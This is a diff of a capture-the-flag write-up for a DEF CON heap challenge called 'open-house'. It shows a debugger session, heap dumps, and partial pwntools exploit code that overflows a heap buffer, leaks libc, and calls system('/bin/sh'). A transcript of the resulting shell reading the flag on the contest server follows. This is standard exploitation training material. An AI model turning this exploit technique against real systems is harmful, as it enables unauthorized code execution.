@@ -5,7 +5,7 @@
 
 
 ```
-(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ ./open-house 
+(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ ./open-house
 Welcome! Step right in and discover our hidden gem! You'll *love* the pool.
 c|v|q> c
 Absolutely, we'd love to have your review!
@@ -13,35 +13,15 @@ AAAAAAAA
 Thanks!
 c|v|m|d|q> d
 Which of these reviews should we delete
-```
-
-
-
-```
-(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ file open-house 
+(base) ubuntu@ubuntu-virtual-machine:~/ctf/defcon$ file open-house
 open-house: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0dff6b6b6435d3c61f0159923f1758e8c9e6a1a8, for GNU/Linux 3.2.0, stripped
-```
-
-
-
-```
 pwndbg> checksec
 RELRO STACK CANARY NX PIE RPATH RUNPATH	Symbols FORTIFY	Fortified	Fortifiable	FILE
 No RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH No Symbols No	0 3 /home/ubuntu/ctf/defcon/open-house
-```
-
-
-
-```
 c|v|q> c
 Absolutely, we'd love to have your review!
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Thanks!
-```
-
-
-
-```
 0x5655aa40:	0x00000000	0x00000000	0x00000000	0x00000211
 0x5655aa50:	0x41414141	0x41414141	0x41414141	0x41414141
 0x5655aa60:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -50,20 +30,10 @@ Thanks!
 0x5655ac30:	0x00000000	0x00000000	0x00000000	0x00000000
 0x5655ac40:	0x00000000	0x00000000	0x00000000	0x00000000
 0x5655ac50:	0x00000000	0x5655a430	0x00000000	0x000203a9
-```
-
-
-
-```
-c|v|m|d|q> m 
+c|v|m|d|q> m
 Which of these reviews should we replace?
 2
 Replacing this one: AAAAAAAAAAAAAAAAAAAAAAAAAAAA　←　これが*pになる
-```
-
-
-
-```
 pwndbg> bins
 tcachebins
 0x110 [ 7]: 0x56559e00 —▸ 0x56559bf0 —▸ 0x565599e0 —▸ 0x565597d0 —▸ 0x565595c0 —▸ 0x565593b0 —▸ 0x565591a0 ◂— 0x0
@@ -77,21 +47,11 @@ fastbins
 0x40: 0x0
 unsortedbin
 all: 0x5655a008 —▸ 0xf7e2a7f8 (main_arena+56) ◂— 0x5655a008
-```
-
-
-
-```
 0x5655a008	0x00000000	0x00000211	........
 0x5655a010	0xf7e2aa0a	0xf7e2aa38	....8...
 0x5655a018	0x5655a008	0x5655a008	..UV..UV
 0x5655a020	0x63207470	0x69646e6f	pt condi
 0x5655a028	0x6e6f6974	0x6874202c	tion, th
-```
-
-
-
-```
 import logging
 
 from pwn import *
@@ -168,7 +128,7 @@ for i in range(11):
  create("")
 
 if option == "local":
- replace(3, cyclic(0x200) + p32(libc_base + libc.symbols["environ"])) 
+ replace(3, cyclic(0x200) + p32(libc_base + libc.symbols["environ"]))
 else:
  replace(3, cyclic(0x200) + p32(libc_base + libc.symbols["environ"]))
 
@@ -194,17 +154,13 @@ binsh = libc_base + next(libc.search(b"/bin/sh"))
 p.sendline(p32(0) * 0x40 + p32(system) + p32(0) + p32(binsh)+ p32(0))
 
 p.interactive()
-```
-
-
-
-```
 What do you think we should we replace it with?
 ls
 challenge
 flag.txt
 run_challenge.sh
 cat flag.txt
-flag{DeveloperTax47n23:SBp6IAciEkQu5HXDfzG_0DcZZO5e5Wv2KKus4D9mrhCLPpWNUgk1U1lrIHRNCdiQ5f3eX9BwQL9-Qerdbkj9qA}[*] Interrupted
+flag{DeveloperTax47n23:
+SBp6IAciEkQu5HXDfzG_0DcZZO5e5Wv2KKus4D9mrhCLPpWNUgk1U1lrIHRNCdiQ5f3eX9BwQL9-Qerdbkj9qA}[*] Interrupted
 [*] Closed connection to open-house-6dvpeatmylgze.shellweplayaga.me port 10001
 ```
